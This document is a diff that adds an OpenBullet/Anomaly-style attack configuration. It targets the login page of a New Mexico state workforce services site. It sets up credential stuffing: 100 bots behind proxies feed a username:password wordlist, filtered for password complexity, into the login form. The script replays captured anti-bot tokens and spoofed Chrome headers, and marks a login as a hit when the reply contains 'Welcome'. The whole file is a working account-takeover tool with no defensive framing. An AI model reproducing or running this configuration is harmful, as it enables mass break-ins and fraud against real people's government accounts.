@@ -1,0 +1,104 @@
+[SETTINGS]
+{
+  "Name": "newmexico.gov working",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-07-18T06:31:23.7987953-07:00",
+  "AdditionalInfo": "",
+  "Author": "EDITED",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [
+    {
+      "SliceName": "<PASS>",
+      "RuleType": 0,
+      "RuleString": "Lowercase",
+      "Id": 508651571
+    },
+    {
+      "SliceName": "<PASS>",
+      "RuleType": 0,
+      "RuleString": "Uppercase",
+      "Id": 1306668412
+    },
+    {
+      "SliceName": "<PASS>",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 1730744515
+    },
+    {
+      "SliceName": "<PASS>",
+      "RuleType": 0,
+      "RuleString": "Symbol",
+      "Id": 1575492296
+    },
+    {
+      "SliceName": "<PASS>",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 1828757486
+    }
+  ],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://sam.dws.state.nm.us/Core/Login.ASPX" 
+  CONTENT "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=&ctl00%24ctl00%24cphMain%24cphMain%24txtUserName=<USER>&ctl00%24ctl00%24cphMain%24cphMain%24txtPassword=<PASS>&ctl00%24ctl00%24cphMain%24cphMain%24customCheck1=You+must+read+and+agree+to+the+terms+of+use+before+continuing.&ctl00%24ctl00%24cphMain%24cphMain%24btnLogin=Log+In&X-Qvkn6ZTR-f=AzZ0wLl6AQAAUoWZEAm9m9W52-VFK-aZbXrUAMYwiLEX3b0HzmxJFeiLD6snAdiDaTqucsP1wH8AAEB3AAAAAA%3D%3D&X-Qvkn6ZTR-b=-2xxt9u&X-Qvkn6ZTR-c=AEDcvLl6AQAAuo_wOvcIuuwZucORYbg5v8xxlXCh4h-afFF-FZQxGahN4brr&X-Qvkn6ZTR-d=AAaihIjBDKGNgUGASZAQhISy1WKUMRmoTeG66wAAAAAoupw5ANJ6Ha0ZwwAog6OibCujX0I&X-Qvkn6ZTR-z=q&X-Qvkn6ZTR-a=3R8BSSulIozVRG9%3DbzBIU0C_5rYoFMn%3DOaZW5s2OobkR5rdSvo-pBYuax6Cf_OJkc-0UwqKIcl8IMpB-0Kj0HSTuvYLg7uWv6jjYG38z5VodcICL6cQ7hn4%3DQRe8CwLv1id6bDV6u6g3tqnNLpx7ff_g2iDaIqM1OUSoZBFYDD1TbaEFlB0aL1AzDGEg1oYka--NWJ-QLZtlZxF1vZl7-4Xrze%3DAk%3DcDBHrYk4JIpbb%3DJsFkTSESTDEchGaUhQNd3NPzIKQXuFb4LGsILu%3DbLgJ8vXVfWvKuKW_BJ4h90CcfXOFuwnQgTO35rxBZHKz571OA1ZKURGkJvPBm0pcHL3Oh6goXKOMUC7GN_-gSkWTEXAlbejMNuT5dzeXfpCi9Aisr7n2FMUMCZqTJb_x-U4LZp6IWXume9PXMWzO11qCseWu5KH5bD-9H16kmhGS6IiU1PAAAXPoRdnpTM9eaO7op_qoPSZb2nKxmgZWUs0TuQ-wuCQVlRWtQwe5Jmu7qZiTga8eRmP0Trp1nRtG7YeeYLQDqQc1s90vKf8gKH8uzzW2iQS%3DI9dv7m032HH06oEd1HvMucxDivZHgV0K9XljmREmZv5%3DVarOhhkGwMfNIHmMLoY7spVKPt9cWBEfVc2iqVDrLIlBOJK4VTuUYj%3DvDeWprpHjLsM%3DiMQlwerpYG5emxUroZ2gRXKkt8qxUFhAFEwWu_dbAw6cqqdKSFPYxempAAsGtK1vtHXE6gkvFkBpRxrCD93hOXwZSFpomDBvK3SeJ7_V8M%3DJZmiST-8EYQYC-81NKSd3Yv0Qn2KNC6XTVVFmrUD2%3DuMfKJcOvDbkLbsNL%3DOY7p%3DAvqST1NsIHVw-Uh-HKmZjsTzLr8_ucBN_7j4KFGD-0ShzcpAh88wKq4EqWTLqHP3dN%3DGxzWkZ594YXBs3GGNm10x0Q_l5jo2WI5v2bY4CnGbb%3DjWWLim%3Du3iZMsbT8s4hBW0tTHHcjN5Mr3XuIJMxvdvEK2RUJminZ5cWjVFf-AwpF_aX80h8bfZ6HNJ2VfLI9GN_-kU0WRa6l%3D_3xkXjtomVr6wn43GHcwwv1N_qmUHhpm-ujzJQx_HpJKjihxnsOQzq1NEeqkvSXQKZ4-WNLjEx4JQsuB3KVSxrMMeMaKNmfK1TOw_PxORqFLU5gczY-SgzSe9jT0Zfl-6Faac7j3oFJcEkg6i0ShHPnrwqkjXubtroMLirz-X4ZVOVO9K5YUEsjhzK5DuYZUUNzweNdidZggqIQzAxWCj25QhSRqd%3DtIamBmViZcHlRMDPBOJTlhEvSoQxoXpmGHION%3DSXQ4hJVbNPuxVgsPJbxMeQP9htMqelJa1zrLtD2gbJATjxwhct8YXmaDX2YXXoZkugHaFw1Qwj27el__GTAoRT8uw6gVKtLYan%3DFfIl%3DYEoI3V6VwvOUxYI0z2fpk%3Djjm%3DZY5fnEgDZQG9N0r2tSsVfXqM7Xj-QotmpRJkxYa6o_V-ECFv671xlBB9RYEXU6N-wDcqCe-2Dgmq4gAe0F__spRYOV-eMKm-jujWWTipx%3DIsTjndp1xcZJ4Ro4fPoppRnEFZtF2kleTSzkz7SjNUBSlTzaaN62-pOIeKpz2wodZTgb0DSfPXxZkWoZ6rER_pKRAZOLMDInweSZmYPT5xS43VT6RFUbeT%3D1vjUVbk%3DIDATq9WDCf6RfaJZ7dtM2m6YugNNcQM%3D8JZ1wD_XKZ%3DROxCrWOv%3DmTwgRWzWPVsQfYZkzwWYLHi9uwpafnad4bG4EAYCeV8OjM0kF5uuQn_jjIXU-gGZwp8ckUTX%3D620M1XZDJHdbCYKRjjK540h95qCBvn7D1EcxKLoVi3t13WCLf7qNePGfdR43drIteazeD2pwSGpjWIbkSoQjD98AAPGDjte4EjSgrHc6CU7UNcdF4lhDtdk-l-0rbtEugVvepm7IdT671i1F-40HMaZHwsrP0Z%3DSnGSUX7sHzPdjKjWknKta5SBmSvkKYqwwrYeUofUwZQBnTR_Hg5xgpb7_rFDLxZm5ltEoRkTDptQFRX8_qKWCqmEXAS3t4K4BFeBgf6bGZfg8rjkI56kLcI8GUI40MtORw7PPXW1GbKqqsEeBBlSLqQ9CddgboUhYw01_a9AHb%3DKphJzXfZLDVev0gM%3DI0xP4S_YHuXzK8Ypw9Z9TXR-UpgwV36a7S_6lHo7D54QTH_irWRfrg70JIU6LcOgzqSYcU-BzqDBV09P%3DjlDVO%3DSmINBibGKwV%3DZhODBqrax%3Dfp7tQZq-5UxUgLCdJoQ1JROtu6rclARFxfDuNRW-TPmM27gI91eidU%3DkD8SnQNV%3DFlPDVe0uM2KsVbMG2fo0SM5Ra4oaj5EL_H5Vbdpx80UliPb4iAZzLeY76841ndfkKoWjIHiVeNGlq0MnEsemDEez0_1nFeeKL09U9CDR1IbClSU7P_UW4Y8oqVG_z17AjWnVNP%3DkzllT%3DP0ZlcH0CAD89rHfDzuantZ6RK_J__ud0arIJLk5HmBdlU6ib-AjxM-70sJFHXiGGESvJiIUO_bLK9i%3D2mP6GsJcchdH%3D509n0O3pHgbqFROiWO-8nc__ddIjo9pbP6iOFb0ZHBMtERFTPKTXUrCqiYRNc_2_zTIDQoz5J3Czb8D82mbH6kroesUxbcEB9sZog6xrGPEzQ1OwlsfSNNKwiV2f8cDz6DnVp9HzfYO_rontO7gB5YoOWPF8EYdZwQa5tV2XLdN%3DonMnvTfbY328cURvZlAiPIAQk_%3DNrnPjI5G4t4cYtUXfdGv1rPZ_5ATvJ1ZeKznAIAol8nJzYd5VGn3vQ5G7VhvvwlAgXGWD74ii9DT5n6%3DVIXAXP4QHCmAeGLaGs7izjnjflgNPX1d_sd_SojIu6XiLYZniY28cnvBJ-6Fo2ScKP0_363CrOd2a2gFtPm_zLSATvbsDaR_jfZpLdzY_Nus7YOWoZ9OFipKOk5v%3DL_hc0o0f9dZk8xq6Aof3CcYo5URrzxHnoond5iztsGOLQquzaVr69u7BaliBY1rPR%3DofLfFM_BsI%3D0i0RkAPnf2OvYfmw1uVGq5PJOU-f6ephZcuPoZCPaeDN0TgG0B5hl3qrAqt7Ok5_EavDGfrVADNWcxquLZZM7_l_1QoI8G8FzbcWTS15K%3DZn4m2lV9R3lApR-jSvht3XO2FSAGWo5RomYRfpNhrj0zGOzIINq1zX3bofhipBWgVFI2oCFdIEo%3DGGpqTd2bjwxRVGIVsdQkht4b0Y7m8hfalfYnGjF2d2LOK7g8hHEfesv7a8MjY-_fgY7zlqnDYhKVhE32wba7VbWbrsPx858GW7WQs3bwIHHx268Tx3pgqmIzkLxQn8sXLl%3DznCED%3D4J3hDYC55cRGwZJNUnzqx3UABVBCiAf4zxwu9v4sPxUXZ40Cx1m5-cNICxmcsbrTmP6IpPqJ27C-BvKMa8gZWud%3DOVZShBTXHVFE5%3DGTSldkcNIfxqOuYSd-OYtX-3L4FL5nD-EmfbCvSji_wpmU4fxsvJTmr8qcM9T_E8xSzipv6hrM%3DvXjsRsTK18W8KfpGF-U0G6HfTZp09rXD145xJqXgvovfJxEmibEi-C0d6jL4hF-sRZuSfOu%3Dhid9_cwdmdXzIUuaAw4QS3pHkZpI_dv_g2wuXaOSQ1Zw-2bi_MVieFIl-AU0IDwZJmAP5fpWYPZ7dD3BbHDDKt2d5s2-IG_HTDNUjgb2gdYe-Gg66qu_Uc1fIPQOWcB%3DhM-fJA-Uh1rveKs4%3DVNwMzxDnYgFqWldgxKDZ3P7Gcf7xOEDrnbPBUz_-0skeNAUM-iLM2BC3VI_Ee2hhvoc%3DxtcUYg2JjJbpoJ0M-FsPDkQ1CmsaxUAVpbeYhqWL0X57I%3DBnUWBUUNapmAd-QQsgzP1u8jq8ZYXJ-wtpHizQ9z3xrNuAmKzUTXFMg2Kr_e98lpbPxeqGgwW%3DHGqr_g8hQAouuTMBa4MnsKQlV7tRI0u1KPBCZ%3DHUYveo8QpUOIjbwptN1bhhMEuPdjw%3DOCkOAxPo-36es5KBOJoKtg_n-Isnk52GKIBQZRgNek0IEt9Il_TvbcLRnFopi5h_J0V93XwBgeD3PqYIqqlqAAsOUkaVVJqUFWP7mmCsYIFqGMUG3m6ezqSzKXmhUB65pOuBi2GonZuDzZZHZUY1hxTP7WW4jr7Al-Ak1Mg7Xn9-ekOY5zHHpxtkIAS7i0ZvWN_goe24frtGeY6xFOgW9OnFq851vFihVQ%3DkoLKgrPHj8n46NX4EBmNcbdNmkhECKWa8%3Dpnu7wISwl04wa2Z70h_6SrjMrITGiqbSjon08xQx9W9sQWdnMiWRgSafmWhDGUcX6LoRWLNd9R8XuRZTKPbw5MG_lobIOaboCU843nTLa-BlXGW_qZlYZkVYa_NHCVjo25bh9%3D%3DpQ0Knp5WiCrAxDAcqVHVgBwh%3D7cIAsZRsJZ107ksjpj0_HPOs0ucqOULEq-Vi%3DbCBaG7qtgG7f%3Dq0eABPeY_Q%3Dkkxa4KZOBujS9M6I1chPdwFEiwFhCkp9%3DHn7nK3Qw-7gXvk-g%3DOlkF9c5HesIHxfgmt7wjBBtA1zekY8wmXZ2J19OqXi7PnSwSMFYVdXk9nfugthOPEzFlPgEmAQG1m5n4ef-sejG8GeeKHQLFUeI-HJHu4GVkhsYHFDOOJCSEgu_7bmWi2ggsBsnxeE3Wo6Zj2nAvITldufggrSbgoq%3DbX8QK4bsmTtvnavn_ZCkE%3DKFYDEICifrUOih5fZn7t9UORHkmGDXHPsa7In1O_ltXZq1xh8Lt7-3LrEMAm4JtSbWIpnDt0HIKVWu9Z1aA2dHkO2TL1QD_%3DixELOfnVoQ5MbW4IQlVO7sFLp74c4jtD7KkTJAl%3D1BcR9gtz-sXw77lhPNGCSrwIaN-ad1kf1MK4BVh8lU5QL%3Di_wBY4O_QC73JXHUfWqkJ40aCCLms6dA0a29fc40%3DKM%3D88S0Mg_r8nN_3Uekhez9xE-368pM_rhXBHGxW_8KkUm4lFRTH9w%3DbevKF2FKitE-rO4wke7Db07YLQtf2fSVvd8mm5sjWBNQm4k29FzeetHbiMS38BIQOtDrXb29KxA26J_v7x2xBgQzK4IEw2hWICZlbArIVvtw6TsUK-5aaH4qP1GNawzbMkfsM2ETsZ5LkoMi-qEhddk3XBGCJt%3DcZksKjWQY52lWGtOnL8EP2qWh0mEei2qEQEtR8RD_HMhqS8ss9l%3D-MMHK4Ymcn9EOKkVJJoaZq_7r8EpGXWmz0eWX3KNs8wRzzOpVUe5Z9rlBKsvHiP0sXRSWAjD7H8Jmu6L0rEfJMVZWnVANX4rA0ZzG4YhO9XVupDmQBgVj%3DN9vlbXSQRvjTRejHEt-%3D5e9qiZJ3UAeqEYlrcdogk6PoWHKQ3OmpdCoRSUZKrpOzBKU1mujXZBxCkUcqq4GQArAmegB8xnnCujsl7ETTQVTie7SnB_AQ8V-kFNM-5P_lbM8Tn_gLA9pz4s3CnrOTE%3DS2zZvBi1YmXVAK1ad7OfprGoEbj2GECBxnIFW1Eoxxe3h0xpOCWug8Qfe_sjnWhWqiwMhVTZto%3DFaQ-7fNF8P88z0zITfIj4o2067t%3D8jRS1JrJSQLkYeVuiNAUgEsxqqCHQd-i_GVB52Z84b5irakeaxNLQ%3DQsB1uk1TZms_VOW3zkHXI5I0hXUsjvTzKG_uz_dr8W3w4-B9kmMw159AtwJfdu3hGcUbg3bQiU%3Dk18phEaYNewljGnXqSgMHoNASY_Uz4I3SrG-04NVAwFOBIFm7t%3DVUeKaDuM04pmYHafpCXuDfttS%3DiwarQLwc%3DQG-DcOY6HrKNvk0WXITDS8V2SMwLFpce0tMhNaqJLowT89rGcb8Gj6XoRoB9Xcxb8g6QNctr2qUlPrk2lGWb8GeuF7qp6b%3DSXRsvfztwFO622tisZNNCH704w_VvJrCz2d4X9djaXr6j2F6VhShKLgKnxbncR26-QoNpapcck-VoWX27SN21uOzgj9I1eZqJQNS7rd9tFaEF-FguT64mq7wGP5oVQmNddE92ChgoCf3kFG0bzbQdrLRdwcuxsIV0hxYN38M9VWouWeb9XUCl1RGJZ4hfSgZnaDGfIUhGjg0GpzwPIqVN5iUar8vPBhZBOxg2mxaB_RdQEi8nFGhF0ijnWAuP942qiZFlW-xFjzerf67mq9jcYLwfbhL6-3mgw2Kec4cFWORuGMUVw9Ds2_U182pmZv6ZRvQIQNsNibN42ae6Mh2wzLHmcT-xRLb33DvH0VWF82OheDgvm2tA4tFLnPwO7wm1MoZV6APkOToK7stnMdom1nIQvSO8CUBmQAhXI2S6OibjQWex6xRv_3UPiQaZZQf29l4CZCjiizSKHF6TOegSolhNtrG72Gr1AEpzM_fB4DdSpUL6-4EFCYuBmK%3D20h51J5PqAR%3DYEiSUL_mU0WDUzSISd1QDTZLXJcI73hFpHKoR5i7a-luDx5NfGmV4NtuQ72m9ahT9xYpS8icCsWs9uo69l4pvZfLSsdveDieoHUIH4A4PFpsPLAaZoPVcTKWpYI-rnKd%3DdOA3ZsSSOLfLjk7Z6StU3ijaM6aoRr9uoucpQLSJEtU-dY5_ASGXHHB5gR%3D2LVDu%3DMN9F5ejdWCeMUhMJ6Uk_NTbMBRsFN4i5d0HhRs%3Dz1HOwhek6UMz40w82D2Fb35al7DVhVix3qzvALdgkLnnF1eYAfVq8Qqmu4Ad2kQf9Mkos3QimDpDTWeiQdUOe9zfWPTjhhP3-l%3D0V5rucmHzeBxUVkCfK1gDI0dh95uZdgtOI7iGErT64jHl_wp6WJmku_Q07d3_zQOQ1OpsaVMkZ_s7zCCnm9d8ZKwb8vNZ1GgcmB6F_e3UUxSo3bZUsb%3DsfXK_ms1VBcZBQEkPLMb2PxwNO4vcqXfB%3DkrqQjf0qh%3Dj-0KIzzSQvCA3lDiRL9Y6gaZmWwadWuw%3DA3eexqjkxmAQz8vrIm70b7C4GQsmgpu00TKb-FSw6ED58v-mWtfJFd8VQEeJKf5sASoQxskhWkVnzsf_uoC4pgWGJlHxKOAJLEbJf%3Dn0jZvp8DHHlb2SE%3DUP0q0PM9zCEGAUn08YawUDcpV7PaGqLPxs0B3TR58FEj37HdVJxVo6F8ido_QLMLEzLH2F4UVGjq1jXt3WdQRL5f-83hqvAf5lRQTqVv5P_UFxtzZYkMJM_zYQFqzuZuj_CL0_dYAtt09tZcgMb4jol7r_sEa-rVzcgwWRoupQYQiO-SdEOrXvl66VWwcKORLTXumWw1voINIraPU6q9FLO9F-1aUj643n-aKUS7EjsPDbiXpW7mM9ItUNsj_eZNBRo9XQkZYvt8-n4wKumjjZx4cx62qgWwUPE2Q5DP-sL5XCfdmzgBrx%3DhRnZRBbL%3D0OlWfp62VN844Kc3b24j65P8UW9jKCDZa271gzEi2pbkY-IMqdc7-SN4x68fQf8xezjcIj" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: sam.dws.state.nm.us" 
+  HEADER "Origin: https://sam.dws.state.nm.us" 
+  HEADER "Referer: https://sam.dws.state.nm.us/Core/Login.ASPX" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The login information you provided is incorrect. Try again." 
+  KEYCHAIN Success OR 
+    KEY "Welcome" 
+
